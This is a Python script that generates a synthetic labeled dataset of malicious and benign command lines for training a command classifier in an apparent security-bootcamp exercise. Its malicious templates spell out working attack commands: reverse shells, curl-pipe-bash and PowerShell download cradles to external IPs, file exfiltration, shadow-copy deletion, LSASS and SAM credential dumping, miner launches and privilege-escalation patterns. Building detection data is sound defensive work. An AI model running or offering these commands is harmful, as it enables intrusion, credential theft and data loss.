#!/usr/bin/env python3
"""
generate_command_pool.py

Generate a large, balanced, labeled dataset of PROCESS-LEVEL OS commands for an
educational malicious-vs-benign command-classifier exercise (attackGen bootcamp).

Output: data/command_pool.csv
Columns: process_name,command_line,label,attack_type
Volume:  30,000 rows = 10 attack_type categories x (500 malicious + 2,500 benign)

Notes
-----
* Malicious rows are well-documented Living-off-the-Land (LOLBin) PATTERNS
  (MITRE ATT&CK / LOLBAS). They are command *signatures* only -- no working
  payloads, no exploit code, no network packets, no DB queries.
* Benign rows are legitimate but deliberately "scary"/complex admin, CI/CD,
  backup, telemetry, and base64-safe-operation commands -- false-positive traps
  that stress a naive keyword/regex detector.
* Stdlib only. Seeded for reproducibility. csv.writer handles quoting.
"""

import base64
import csv
import os
import random

random.seed(1337)

OUT_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "command_pool.csv")
MAL_PER_CAT = 500
BEN_PER_CAT = 2500
MAX_TRIES_FACTOR = 200  # safety cap multiplier for the dedup sampling loop


# --------------------------------------------------------------------------- #
# Slot-filling helpers
# --------------------------------------------------------------------------- #
class SafeDict(dict):
    def __missing__(self, key):
        return "{" + key + "}"


def pick(seq):
    return random.choice(seq)


def b64(s):
    return base64.b64encode(s.encode()).decode()


# --------------------------------------------------------------------------- #
# Shared filler pools (entropy sources)
# --------------------------------------------------------------------------- #
INT_IP = [f"10.{random.randint(0, 40)}.{random.randint(0, 255)}.{random.randint(2, 254)}" for _ in range(80)]
EXT_IP = [f"{a}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(2, 254)}"
          for a in (185, 193, 45, 91, 5) for _ in range(20)]

HOSTS = [f"{p}{n:02d}" for p in ["web", "app", "db", "cache", "node", "worker", "build", "ci", "edge", "svc"]
         for n in range(1, 13)]
DOMAINS = ["corp.local", "ad.example.com", "internal.acme.io", "prod.svc.cluster.local", "eng.example.net"]
USERS = ["deploy", "svc_backup", "jenkins", "ansible", "admin", "root", "sysadmin", "build", "ops",
         "postgres", "mssql", "www-data", "automation", "release"]
SHARES = [f"\\\\{h}\\admin$" for h in HOSTS[:20]] + [f"\\\\{h}\\C$" for h in HOSTS[:20]]
DEEP = ["/srv/data/projects/2024", "/var/lib/app/customer/exports", "/opt/vendor/pkg/cache/objects",
        "/home/{u}/Documents/Finance/Q{q}", "/mnt/storage/shares/department/legal",
        "/data/warehouse/staging/landing/raw", "/usr/local/share/pipeline/artifacts/build",
        "C:\\Users\\{u}\\AppData\\Local\\Temp\\cache", "C:\\ProgramData\\Vendor\\Telemetry\\spool",
        "/var/opt/sccm/packages/distribution", "/srv/backups/nightly/incremental"]
FNAMES = ["report_final", "ledger_2024", "design_spec", "customer_db", "payroll", "archive_set",
          "session_blob", "dataset_part", "snapshot", "telemetry_batch", "audit_trail", "manifest"]
PORTS = [443, 4444, 8443, 53, 80, 8080, 9001, 1337, 31337, 2222, 5985, 5986]
HEX = ["".join(random.choice("0123456789abcdef") for _ in range(random.choice([12, 16, 32]))) for _ in range(120)]
TASKS = ["UpdateSync", "TelemetryFlush", "GoogleUpdateTaskMachine", "OneDriveStandalone",
         "AdobeGCInvoker", "NvProfileUpdater", "WindowsDefenderScan", "MaintenanceCleanup",
         "AppHealthCheck", "VendorAgentBeacon", "CacheWarmer", "MetricsRollup"]
SVCNAMES = ["Spooler", "WinDefend", "BITS", "Schedule", "EventLog", "RemoteRegistry", "TermService",
            "wuauserv", "LanmanServer", "Dnscache", "VendorAgent", "BackupSvc"]
PROFILES = ["allprofiles", "domainprofile", "privateprofile", "publicprofile"]
FWGROUPS = ["Remote Desktop", "File and Printer Sharing", "Windows Defender Firewall", "Core Networking",
            "Network Discovery", "Remote Event Log Management", "Windows Management Instrumentation (WMI)",
            "Remote Service Management"]
LOGS = ["Security", "System", "Application", "Setup", "Windows PowerShell",
        "Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-PowerShell/Operational",
        "Microsoft-Windows-TaskScheduler/Operational", "Microsoft-Windows-WinRM/Operational",
        "ForwardedEvents", "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
        "Microsoft-Windows-Windows Defender/Operational"]
MP_OPTS = ["DisableRealtimeMonitoring", "DisableIOAVProtection", "DisableBehaviorMonitoring",
           "DisableScriptScanning", "DisableArchiveScanning", "DisableScanningNetworkFiles",
           "DisableBlockAtFirstSeen", "DisableIntrusionPreventionSystem"]
AUDIT_CATS = ["Logon/Logoff", "Account Logon", "Object Access", "Privilege Use", "Detailed Tracking",
              "Policy Change", "System", "Account Management"]
DRIVES = ["C:", "D:", "E:"]
LOGPATHS = ["/var/log/secure", "/var/log/auth.log", "/var/log/syslog", "/var/log/audit/audit.log",
            "/var/log/messages", "/var/log/wtmp", "/var/log/btmp", "/var/log/lastlog"]
DATES = ["2019-01-01", "2020-03-15", "2018-07-04", "2021-11-30", "2017-05-12", "2022-02-28",
         "2019-09-09", "2020-12-25"]

# harmless strings -> base64 (benign "scary-looking" payloads + benign data args)
BENIGN_B64 = [b64(x) for x in [
    "Get-Service | Where-Object {$_.Status -eq 'Running'}",
    "export REPORT_DATE=2024-06-01; rotate-logs --keep 30",
    "config: {retries: 3, timeout: 30, region: eu-west-1}",
    "checksum verify manifest v2 ok",
    "feature_flags=enable_cache,enable_metrics,enable_trace",
    "backup window 02:00-04:00 UTC nightly incremental",
    "healthcheck endpoint /readyz expects 200",
]]
# benign-content stand-ins so we never emit working payloads
MAL_B64 = [b64(x) for x in [
    "<encoded-command-placeholder>", "<staged-loader-marker>", "<beacon-config-marker>",
    "<task-xml-marker>", "<downloader-stub-marker>",
]]


def fill(s):
    """Fill common slots in a template string from the shared pools."""
    return s.format_map(SafeDict(
        u=pick(USERS), h=pick(HOSTS), h2=pick(HOSTS), d=pick(DOMAINS),
        int_ip=pick(INT_IP), ext_ip=pick(EXT_IP), port=pick(PORTS), hex=pick(HEX),
        fn=pick(FNAMES), q=random.randint(1, 4), m=random.randint(0, 20), p=random.randint(0, 99),
        share=pick(SHARES),
        deep=pick(DEEP).format_map(SafeDict(u=pick(USERS), q=random.randint(1, 4))),
        ver=f"{random.randint(0, 9)}.{random.randint(0, 40)}.{random.randint(0, 9)}",
        task=pick(TASKS), svc=pick(SVCNAMES), bb=pick(BENIGN_B64), mb=pick(MAL_B64),
        kb=random.choice([128, 256, 512, 1024, 2048]), n=random.randint(2, 64),
        profile=pick(PROFILES), fwgroup=pick(FWGROUPS), log=pick(LOGS), mpopt=pick(MP_OPTS),
        auditcat=pick(AUDIT_CATS), drive=pick(DRIVES), logpath=pick(LOGPATHS), date=pick(DATES),
    ))


# --------------------------------------------------------------------------- #
# Per-category templates: (process_name, command_line_format)
# --------------------------------------------------------------------------- #
CATEGORIES = {
    "ransomware": {
        "malicious": [
            ("tar", "tar -czf /tmp/.{hex}/{fn}.tar.gz /home/{u}/Documents --remove-files"),
            ("openssl", "openssl enc -aes-256-cbc -salt -in {deep}/{fn}.db -out {deep}/{fn}.db.locked -k {hex}"),
            ("gpg", "gpg --batch --yes --passphrase {hex} -c {deep}/{fn}.xlsx && shred -u {deep}/{fn}.xlsx"),
            ("7z", "7z a -p{hex} -mhe=on -sdel /tmp/.{hex}/{fn}.7z {deep}"),
            ("powershell.exe", "powershell.exe -nop -w hidden -c \"Get-ChildItem C:\\Users\\{u} -Recurse -Include *.docx,*.xlsx | ForEach-Object {{ $_.FullName }}\""),
            ("cipher.exe", "cipher.exe /e /s:C:\\Users\\{u}\\Documents"),
            ("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet"),
            ("wbadmin.exe", "wbadmin.exe delete catalog -quiet"),
            ("bcdedit.exe", "bcdedit.exe /set {{default}} recoveryenabled No"),
            ("find", "find /home/{u} -type f -name '*.{fn}' -exec openssl enc -aes-256-cbc -k {hex} -in {{}} -out {{}}.enc \\;"),
        ],
        "benign": [
            ("tar", "tar -czf /srv/backups/nightly/{fn}-{ver}.tar.gz {deep} --exclude='*.tmp'"),
            ("borg", "borg create --stats --compression zstd,9 /mnt/backup::{fn}-{m}-{p} {deep}"),
            ("restic", "restic -r sftp:svc_backup@{h}.{d}:/backups backup {deep} --tag nightly --exclude-caches"),
            ("rsync", "rsync -aHAX --delete --partial {deep}/ /srv/backups/incremental/{h}/"),
            ("duplicity", "duplicity --full-if-older-than 7D --encrypt-key {hex} {deep} file:///srv/backups/dup/{h}"),
            ("gpg", "gpg --batch --yes --recipient backups@{d} -e -o /srv/backups/{fn}.gpg {deep}/{fn}.tar"),
            ("openssl", "openssl dgst -sha256 -out /srv/backups/{fn}.sha256 {deep}/{fn}.tar.gz"),
            ("7z", "7z a -mx=9 -ms=on /srv/backups/archive/{fn}-{ver}.7z {deep} -xr!node_modules"),
            ("zfs", "zfs snapshot tank/data/{h}@nightly-{m}{p}"),
            ("pg_dump", "pg_dump -Fc -Z9 -f /srv/backups/db/{fn}-{ver}.dump warehouse"),
            ("powershell.exe", "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\Backup-FileShares.ps1 -Source {deep} -Dest \\\\{h}\\backups$ -Retain {n}"),
            ("robocopy", "robocopy {deep} \\\\{h}\\backups$\\{fn} /MIR /Z /R:3 /W:5 /LOG:C:\\Logs\\backup-{p}.log"),
        ],
    },
    "lateral_movement": {
        "malicious": [
            ("wmic.exe", "wmic.exe /node:{int_ip} /user:{u} process call create \"cmd /c certutil -urlcache -f http://{ext_ip}/{hex} %TEMP%\\{hex}\""),
            ("psexec.exe", "psexec.exe \\\\{int_ip} -u {u} -p {hex} -d cmd /c \"powershell -nop -w hidden -enc {mb}\""),
            ("powershell.exe", "powershell.exe -c \"Invoke-Command -ComputerName {h} -ScriptBlock {{ iex (New-Object Net.WebClient).DownloadString('http://{ext_ip}/{hex}') }}\""),
            ("sc.exe", "sc.exe \\\\{int_ip} create {svc} binPath= \"cmd /c C:\\Windows\\Temp\\{hex}.exe\" start= auto"),
            ("schtasks.exe", "schtasks.exe /create /s {int_ip} /u {u} /tn {task} /tr \"C:\\Windows\\Temp\\{hex}.exe\" /sc onstart /ru SYSTEM /f"),
            ("at.exe", "at.exe \\\\{int_ip} 13:00 cmd /c \\\\{h}\\C$\\Windows\\Temp\\{hex}.bat"),
            ("ssh", "ssh {u}@{int_ip} 'curl -s http://{ext_ip}/{hex} | bash'"),
            ("crackmapexec", "crackmapexec smb {int_ip}/24 -u {u} -p {hex} -x 'whoami'"),
            ("wmic.exe", "wmic.exe /node:{int_ip} path win32_process call create \"rundll32 C:\\Temp\\{hex}.dll,Start\""),
            ("powershell.exe", "powershell.exe Enter-PSSession -ComputerName {h} -Credential {u}; iex {mb}"),
        ],
        "benign": [
            ("ansible-playbook", "ansible-playbook -i inventory/prod site.yml --limit {h} --tags deploy --extra-vars 'version={ver}'"),
            ("ansible", "ansible {h}* -m shell -a 'systemctl restart app && systemctl status app' --become"),
            ("pdsh", "pdsh -w {h}[01-12] 'yum update -y --security && needs-restarting -r'"),
            ("salt", "salt '{h}*' state.apply webserver pillar='{{\"release\": \"{ver}\"}}'"),
            ("kubectl", "kubectl rollout restart deployment/{fn} -n production --kubeconfig /etc/k8s/prod.conf"),
            ("psexec.exe", "psexec.exe \\\\{h} -u CORP\\{u} -h -accepteula msiexec /i \\\\{h2}\\sccm$\\packages\\{fn}-{ver}.msi /qn"),
            ("powershell.exe", "powershell.exe Invoke-Command -ComputerName {h} -FilePath C:\\Scripts\\Deploy-Agent.ps1 -ArgumentList {ver}"),
            ("sccm", "ccmexec.exe /deploy /package:{fn}-{ver} /collection:AllWorkstations /schedule:asap"),
            ("scp", "scp -i /etc/ci/deploy_key build/{fn}-{ver}.tar.gz {u}@{h}.{d}:/opt/app/releases/"),
            ("ssh", "ssh -i /etc/ci/deploy_key {u}@{h}.{d} 'sudo systemctl restart {fn} && sudo journalctl -u {fn} --since \"1 min ago\"'"),
            ("terraform", "terraform apply -auto-approve -target=module.cluster.node.{h} -var image_version={ver}"),
            ("winrm", "winrm invoke Restart wmicimv2/Win32_Service?Name={svc} -r:http://{h}:5985"),
        ],
    },
    "persistence": {
        "malicious": [
            ("schtasks.exe", "schtasks.exe /create /tn \"\\Microsoft\\Windows\\{task}\" /tr \"powershell -nop -w hidden -enc {mb}\" /sc minute /mo 30 /ru SYSTEM /f"),
            ("crontab", "(crontab -l 2>/dev/null; echo '*/10 * * * * curl -s http://{ext_ip}/{hex}|bash') | crontab -"),
            ("reg.exe", "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {task} /t REG_SZ /d \"C:\\Users\\{u}\\AppData\\Roaming\\{hex}.exe\" /f"),
            ("sc.exe", "sc.exe create {svc} binPath= \"C:\\ProgramData\\{hex}.exe\" start= auto error= ignore"),
            ("powershell.exe", "powershell.exe -c \"New-Service -Name {svc} -BinaryPathName 'C:\\Windows\\Temp\\{hex}.exe' -StartupType Automatic\""),
            ("bash", "bash -c \"echo '@reboot {u} /tmp/.{hex}/run.sh' >> /etc/cron.d/{hex}\""),
            ("systemctl", "systemctl enable --now /etc/systemd/system/{hex}.service"),
            ("powershell.exe", "powershell.exe Register-ScheduledTask -TaskName {task} -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute 'C:\\Temp\\{hex}.exe')"),
            ("wmic.exe", "wmic.exe /namespace:\\\\root\\subscription PATH __EventConsumer CREATE Name='{task}', CommandLineTemplate='C:\\Temp\\{hex}.exe'"),
            ("bash", "bash -c \"cp /tmp/.{hex}/agent ~/.config/autostart/{hex}.desktop\""),
        ],
        "benign": [
            ("schtasks.exe", "schtasks.exe /create /tn \"{task}\" /tr \"C:\\Program Files\\Vendor\\updater.exe /silent\" /sc daily /st 03:00 /ru SYSTEM /f"),
            ("crontab", "crontab -u {u} -l | grep -v logrotate; echo '0 2 * * * /usr/sbin/logrotate /etc/logrotate.conf' | crontab -u {u} -"),
            ("systemctl", "systemctl enable --now {fn}-telemetry.timer"),
            ("reg.exe", "reg.exe add HKLM\\SOFTWARE\\Vendor\\{fn} /v Version /t REG_SZ /d {ver} /f"),
            ("sc.exe", "sc.exe config {svc} start= delayed-auto"),
            ("powershell.exe", "powershell.exe Register-ScheduledTask -TaskName {task} -Xml (Get-Content 'C:\\Program Files\\Vendor\\task.xml' | Out-String) -User SYSTEM"),
            ("bash", "bash -c \"systemctl --user enable {fn}.service && loginctl enable-linger {u}\""),
            ("apt-get", "apt-get install -y --no-install-recommends vendor-agent={ver} && systemctl enable vendor-agent"),
            ("cron", "echo '*/15 * * * * {u} /opt/monitoring/collect-metrics.sh --push gateway://{int_ip}:9091' > /etc/cron.d/metrics"),
            ("update-rc.d", "update-rc.d {fn}-agent defaults 95 05"),
            ("launchctl", "launchctl bootstrap system /Library/LaunchDaemons/com.vendor.{fn}.plist"),
            ("powershell.exe", "powershell.exe New-Service -Name {svc} -BinaryPathName 'C:\\Program Files\\Vendor\\agent.exe --service' -DisplayName 'Vendor Health Agent' -StartupType Automatic"),
        ],
    },
    "credential_dumping": {
        "malicious": [
            ("reg.exe", "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\{hex}.sam /y"),
            ("reg.exe", "reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\{hex}.sys /y"),
            ("esentutl.exe", "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Windows\\Temp\\{hex}.dit"),
            ("powershell.exe", "powershell.exe -c \"Copy-Item 'C:\\Users\\{u}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data' C:\\Windows\\Temp\\{hex}.db\""),
            ("vssadmin.exe", "vssadmin.exe create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\{hex}.dit"),
            ("cat", "cat /etc/shadow > /tmp/.{hex}/sh.txt"),
            ("cp", "cp /home/{u}/.mozilla/firefox/*.default-release/logins.json /tmp/.{hex}/"),
            ("procdump.exe", "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\{hex}.dmp"),
            ("rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Temp\\{hex}.dmp full"),
            ("findstr", "findstr /si password C:\\Users\\{u}\\*.config C:\\Users\\{u}\\*.xml > C:\\Temp\\{hex}.txt"),
        ],
        "benign": [
            ("reg.exe", "reg.exe export HKLM\\SOFTWARE\\Vendor\\{fn} C:\\Backups\\reg\\{fn}-{ver}.reg /y"),
            ("pg_dump", "pg_dump -h {int_ip} -U {u} -Fc -f /srv/backups/db/{fn}-{ver}.dump --no-password customers"),
            ("mysqldump", "mysqldump --single-transaction --routines --triggers -u {u} -p$DB_PASS billing > /srv/backups/{fn}.sql"),
            ("powershell.exe", "powershell.exe Export-Certificate -Cert Cert:\\LocalMachine\\My\\{hex} -FilePath C:\\Backups\\certs\\{fn}.cer"),
            ("vaultcmd.exe", "vaultcmd.exe /listcreds:\"Windows Credentials\" /all"),
            ("aws", "aws secretsmanager get-secret-value --secret-id prod/{fn}/api --query SecretString --output text --profile ci"),
            ("vault", "vault kv get -format=json secret/data/{fn}/db | jq -r '.data.data.url'"),
            ("certutil.exe", "certutil.exe -store My {hex}"),
            ("openssl", "openssl pkcs12 -export -in /etc/ssl/{fn}.crt -inkey /etc/ssl/{fn}.key -out /srv/backups/certs/{fn}.pfx -passout pass:{hex}"),
            ("ldapsearch", "ldapsearch -x -H ldap://{h}.{d} -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL"),
            ("kubectl", "kubectl get secret {fn}-tls -n production -o yaml > /srv/backups/k8s/{fn}-secret.yaml"),
            ("gpg", "gpg --export-secret-keys --armor backups@{d} > /srv/backups/keys/{fn}.asc"),
        ],
    },
    "reverse_shell": {
        "malicious": [
            ("bash", "bash -i >& /dev/tcp/{ext_ip}/{port} 0>&1"),
            ("bash", "bash -c 'exec 5<>/dev/tcp/{ext_ip}/{port}; cat <&5 | while read l; do $l 2>&5 >&5; done'"),
            ("nc", "nc -e /bin/bash {ext_ip} {port}"),
            ("ncat", "ncat {ext_ip} {port} -e /bin/bash"),
            ("python3", "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ext_ip}\",{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\"])'"),
            ("powershell.exe", "powershell.exe -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('{ext_ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}}\""),
            ("perl", "perl -e 'use Socket;$i=\"{ext_ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));exec(\"/bin/sh -i\");'"),
            ("php", "php -r '$s=fsockopen(\"{ext_ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
            ("mkfifo", "mkfifo /tmp/.{hex};cat /tmp/.{hex}|/bin/sh -i 2>&1|nc {ext_ip} {port} >/tmp/.{hex}"),
            ("socat", "socat TCP:{ext_ip}:{port} EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane"),
        ],
        "benign": [
            ("ssh", "ssh -tt -i /etc/ci/deploy_key {u}@{h}.{d} 'sudo systemctl restart {fn}'"),
            ("ansible-pull", "ansible-pull -U git@{h}.{d}:ops/playbooks.git -i localhost, --vault-password-file /etc/ansible/vault.pass site.yml"),
            ("socat", "socat TCP-LISTEN:{port},reuseaddr,fork TCP:{int_ip}:5432"),
            ("ssh", "ssh -N -L {port}:localhost:5432 {u}@{h}.{d}"),
            ("kubectl", "kubectl exec -it deploy/{fn} -n production -- /bin/sh -c 'rake db:migrate:status'"),
            ("docker", "docker exec -it {fn}-{hex} /bin/bash -lc 'tail -f /var/log/app/current'"),
            ("tmux", "tmux new-session -d -s deploy 'ssh {u}@{h} \"journalctl -u {fn} -f\"'"),
            ("nc", "nc -z -w2 {int_ip} {port} && echo 'port {port} open on {int_ip}'"),
            ("ncat", "ncat --ssl --listen {port} --sh-exec 'cat /opt/app/health.json' --max-conns 5"),
            ("expect", "expect -f /opt/automation/rotate-router-{h}.exp"),
            ("mosh", "mosh --ssh='ssh -i /etc/ci/key' {u}@{h}.{d} -- tmux attach -t deploy"),
            ("python3", "python3 -m http.server {port} --directory /srv/artifacts/{fn} --bind {int_ip}"),
        ],
    },
    "data_exfiltration": {
        "malicious": [
            ("curl", "curl -s -X POST -T /tmp/.{hex}/{fn}.tar.gz http://{ext_ip}:{port}/upload"),
            ("certutil.exe", "certutil.exe -urlcache -split -f -encode C:\\Temp\\{hex}.dat & curl -s http://{ext_ip}/{hex} --data-binary @C:\\Temp\\{hex}.dat"),
            ("tar", "tar czf - {deep} | curl -s -T - ftp://{ext_ip}/incoming/{hex}.tgz --user {u}:{hex}"),
            ("powershell.exe", "powershell.exe -c \"Compress-Archive {deep} $env:TEMP\\{hex}.zip; Invoke-RestMethod -Uri http://{ext_ip}/x -Method Post -InFile $env:TEMP\\{hex}.zip\""),
            ("scp", "scp -P {port} -r {deep} {u}@{ext_ip}:/tmp/{hex}/"),
            ("nslookup", "for f in $(ls {deep}); do nslookup $(echo $f|base64).{hex}.{ext_ip}; done"),
            ("wget", "wget --post-file=/tmp/.{hex}/{fn}.zip http://{ext_ip}:{port}/c -O /dev/null"),
            ("rclone", "rclone copy {deep} mega:/exfil/{hex} --transfers 16 --ignore-existing -q"),
            ("openssl", "tar cz {deep} | openssl enc -aes-256-cbc -k {hex} | curl -s --data-binary @- http://{ext_ip}/u"),
            ("bitsadmin.exe", "bitsadmin.exe /transfer x /upload http://{ext_ip}/u C:\\Temp\\{hex}.zip"),
        ],
        "benign": [
            ("rsync", "rsync -az --partial --bwlimit=20000 /var/log/{fn}/ logsink@{int_ip}:/data/logs/{h}/"),
            ("curl", "curl -s -X POST --data-binary @/var/log/app/metrics.json http://{int_ip}:9091/metrics/job/{fn} -H 'Content-Type: application/json'"),
            ("aws", "aws s3 sync /srv/backups/db s3://acme-backups-eu/{fn}/{ver}/ --storage-class STANDARD_IA --only-show-errors"),
            ("gsutil", "gsutil -m rsync -r -d /data/warehouse/exports gs://acme-warehouse/{fn}/"),
            ("tar", "tar czf - {deep} | ssh -i /etc/ci/key backup@{int_ip} 'cat > /srv/backups/{fn}-{ver}.tgz'"),
            ("azcopy", "azcopy copy '{deep}' 'https://acme.blob.core.windows.net/backups/{fn}?<SAS>' --recursive --log-level ERROR"),
            ("filebeat", "filebeat -e -c /etc/filebeat/filebeat.yml --path.data /var/lib/filebeat/{fn}"),
            ("fluent-bit", "fluent-bit -i tail -p path=/var/log/{fn}/*.log -o forward -p host={int_ip} -p port=24224"),
            ("curl", "curl -s -T /srv/reports/{fn}-{ver}.pdf -u svc_report:$RPT_TOKEN https://reports.{d}/api/v2/upload"),
            ("scp", "scp -C -i /etc/ci/key /srv/backups/db/{fn}-{ver}.dump backup@{h}.{d}:/srv/offsite/"),
            ("restic", "restic -r s3:s3.amazonaws.com/acme-backups backup {deep} --tag exfil-test --limit-upload 50000"),
            ("kubectl", "kubectl cp production/{fn}-{hex}:/var/log/app /tmp/diag/{fn} -c app"),
        ],
    },
    "sql_exploitation": {
        "malicious": [
            ("cmd.exe", "cmd.exe /c \"whoami & ipconfig /all\" (spawned by sqlservr.exe via xp_cmdshell)"),
            ("powershell.exe", "powershell.exe -nop -enc {mb} (parent: sqlservr.exe, user: NT SERVICE\\MSSQLSERVER)"),
            ("certutil.exe", "certutil.exe -urlcache -f http://{ext_ip}/{hex} C:\\Temp\\{hex}.exe (parent: sqlservr.exe)"),
            ("bash", "bash -c 'id; uname -a; curl -s http://{ext_ip}/{hex}|bash' (parent: postgres, COPY TO PROGRAM)"),
            ("sh", "sh -c 'cp /bin/bash /tmp/.{hex}; chmod 4755 /tmp/.{hex}' (parent: mysqld, user: mysql)"),
            ("cmd.exe", "cmd.exe /c \"net user {u} {hex} /add & net localgroup administrators {u} /add\" (parent: sqlservr.exe)"),
            ("python3", "python3 -c 'import os;os.system(\"id\")' (parent: postgres plpython3u)"),
            ("wget", "wget -qO /tmp/.{hex} http://{ext_ip}/{hex} && /tmp/.{hex} (parent: mysqld)"),
            ("cmd.exe", "cmd.exe /c bcp \"SELECT * FROM sys.databases\" queryout C:\\Temp\\{hex}.dat -c -T (parent: sqlservr.exe)"),
            ("powershell.exe", "powershell.exe iex(New-Object Net.WebClient).DownloadString('http://{ext_ip}/{hex}') (parent: sqlservr.exe)"),
        ],
        "benign": [
            ("pg_dump", "pg_dump -h {int_ip} -U postgres -Fc -j 4 -f /srv/backups/db/{fn}-{ver}.dump analytics (user: postgres)"),
            ("vacuumdb", "vacuumdb --all --analyze-in-stages -j 8 -U postgres (user: postgres)"),
            ("pg_repack", "pg_repack -d warehouse -t public.{fn} --no-superuser-check (user: postgres)"),
            ("mysqlcheck", "mysqlcheck --all-databases --optimize --auto-repair -u root -p$DB_PASS (user: mysql)"),
            ("sqlcmd", "sqlcmd -S {int_ip} -E -i C:\\Maintenance\\reindex-{fn}.sql -o C:\\Logs\\reindex-{p}.log (user: MSSQLSERVER)"),
            ("pgbackrest", "pgbackrest --stanza=main --type=incr backup (user: postgres)"),
            ("powershell.exe", "powershell.exe Backup-SqlDatabase -ServerInstance {h} -Database {fn} -BackupFile 'X:\\backups\\{fn}-{ver}.bak' (user: MSSQLSERVER)"),
            ("pg_basebackup", "pg_basebackup -h {int_ip} -U replicator -D /var/lib/postgresql/standby -Fp -Xs -P (user: postgres)"),
            ("mysqldump", "mysqldump --single-transaction --master-data=2 -u backup -p$DB_PASS billing | gzip > /srv/backups/{fn}.sql.gz (user: mysql)"),
            ("sqlpackage", "sqlpackage /Action:Export /SourceServerName:{h} /SourceDatabaseName:{fn} /TargetFile:X:\\dac\\{fn}.bacpac (user: MSSQLSERVER)"),
            ("psql", "psql -h {int_ip} -U postgres -c 'REINDEX DATABASE warehouse' -q (user: postgres)"),
            ("ora_backup", "rman target / cmdfile=/opt/oracle/scripts/backup-{fn}.rman log=/var/log/rman-{p}.log (user: oracle)"),
        ],
    },
    "crypto_miner": {
        "malicious": [
            ("kworkerds", "kworkerds -o stratum+tcp://{ext_ip}:{port} -u {hex} -p x --donate-level 0 --cpu-priority 5"),
            ("sshd", "sshd --algo rx/0 -o {ext_ip}:{port} -u {hex} --background --max-cpu-usage 90 (masquerade)"),
            ("bash", "bash -c 'nohup curl -s http://{ext_ip}/x|bash >/dev/null 2>&1 &' (xmrig loader)"),
            ("python3", "python3 -c 'while True: pass' (8 procs pinned, parent: /tmp/.{hex})"),
            ("dbus-daemon", "dbus-daemon --config /tmp/.{hex}/c.json -o pool.{ext_ip}:{port} (masquerade)"),
            ("systemd", "/tmp/.{hex}/systemd -c /tmp/.{hex}/config.json --cpu-max-threads-hint 100"),
            ("nohup", "nohup /dev/shm/.{hex} --coin monero --url {ext_ip}:{port} --tls --rig-id {h} &"),
            ("crontab", "(crontab -l;echo '@reboot /tmp/.{hex}/miner --max-cpu-usage 95')|crontab -"),
            ("docker", "docker run -d --rm --name {fn} --entrypoint /bin/sh alpine -c 'apk add curl;curl -s {ext_ip}/x|sh'"),
            ("xmrig", "xmrig --url {ext_ip}:{port} --user {hex} --coin monero --donate-level 1 --background --no-color"),
        ],
        "benign": [
            ("stress-ng", "stress-ng --cpu {n} --cpu-method matrixprod --timeout 600s --metrics-brief"),
            ("sysbench", "sysbench cpu --cpu-max-prime=20000 --threads={n} --time=300 run"),
            ("ffmpeg", "ffmpeg -i /srv/media/{fn}.mov -c:v libx264 -preset slow -crf 18 -threads {n} /srv/media/out/{fn}.mp4"),
            ("blender", "blender -b /srv/render/{fn}.blend -o /srv/render/out/ -F PNG -x 1 -f {n} -- --cycles-device CPU"),
            ("make", "make -j{n} all && make -j{n} test (CI build farm node {h})"),
            ("hashcat", "hashcat -b -m 0 -D 1 --quiet (benchmark only, QA validation node {h})"),
            ("openssl", "openssl speed -multi {n} -seconds 30 aes-256-cbc sha256 rsa2048"),
            ("phoronix-test-suite", "phoronix-test-suite batch-run pts/compress-7zip pts/openssl"),
            ("docker", "docker run --rm --cpus {n} buildkit:latest build --tag {fn}:{ver} /workspace"),
            ("k6", "k6 run --vus 200 --duration 5m /opt/loadtests/{fn}.js"),
            ("ab", "ab -n 100000 -c 500 -k https://{h}.{d}/healthz"),
            ("gzip", "tar c {deep} | gzip -9 | wc -c (compression ratio QA check)"),
        ],
    },
    "privilege_escalation": {
        "malicious": [
            ("cmd.exe", "cmd.exe /c \"sc qc {svc}\" & copy C:\\Temp\\{hex}.exe \"C:\\Program Files\\Vendor\\Common.exe\" (unquoted path abuse)"),
            ("runas.exe", "runas.exe /user:Administrator /savecred \"cmd /c C:\\Temp\\{hex}.exe\""),
            ("bash", "bash -c 'cp /bin/bash /tmp/.{hex}; chmod u+s /tmp/.{hex}; /tmp/.{hex} -p'"),
            ("sudo", "sudo -u#-1 /bin/bash (CVE-2019-14287 pattern)"),
            ("pkexec", "pkexec --version; GCONV_PATH=/tmp/.{hex} pkexec /bin/sh (pwnkit pattern)"),
            ("find", "find / -perm -4000 -type f 2>/dev/null; /usr/bin/find . -exec /bin/sh -p \\; -quit"),
            ("powershell.exe", "powershell.exe Start-Process cmd -Verb RunAs -ArgumentList '/c C:\\Temp\\{hex}.exe' (UAC bypass)"),
            ("fodhelper.exe", "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\Temp\\{hex}.exe /f & fodhelper.exe"),
            ("dirtypipe", "/tmp/.{hex}/exploit /etc/passwd 1 'root:...' (CVE-2022-0847 pattern)"),
